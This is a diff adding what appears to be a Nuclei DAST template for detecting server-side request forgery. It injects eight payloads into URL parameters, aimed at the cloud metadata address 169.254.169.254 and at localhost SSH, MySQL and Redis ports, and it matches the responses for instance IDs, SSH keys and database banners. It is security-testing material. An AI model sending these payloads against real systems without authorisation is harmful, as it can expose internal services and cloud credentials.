@@ -1,0 +1,56 @@
+id: cosckoya-dast-ssrf-fuzz
+
+info:
+  name: DAST SSRF Fuzzing
+  author: cosckoya
+  severity: critical
+  description: |
+    DAST fuzzing template for Server-Side Request Forgery detection.
+    Tests multiple SSRF payloads against URL parameters to detect
+    internal network access from the server.
+  reference:
+    - https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
+    - https://cwe.mitre.org/data/definitions/918.html
+  tags: dast,fuzz,ssrf,critical
+  metadata:
+    max-request: 8
+    verified: true
+    fuzz-type: parameter
+    fuzz-aggression: medium
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/?url=http://127.0.0.1:22/"
+      - "{{BaseURL}}/?url=http://localhost:8080/"
+      - "{{BaseURL}}/?url=http://169.254.169.254/latest/user-data/"
+      - "{{BaseURL}}/?redirect=http://169.254.169.254/"
+      - "{{BaseURL}}/?callback=http://127.0.0.1:3306/"
+      - "{{BaseURL}}/?webhook=http://169.254.169.254/"
+      - "{{BaseURL}}/?fetch=http://localhost:6379/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "ami-id"
+          - "instance-id"
+          - "ssh-rsa"
+          - "MySQL"
+          - "redis_version"
+          - "placement"
+        part: body
+        condition: or
+      - type: status
+        status:
+          - 200
+          - 302
+
+    extractors:
+      - type: regex
+        part: body
+        name: ssrf-response
+        regex:
+          - "(ami-id|instance-id|ssh-rsa|MySQL|redis_version)"
+        group: 0
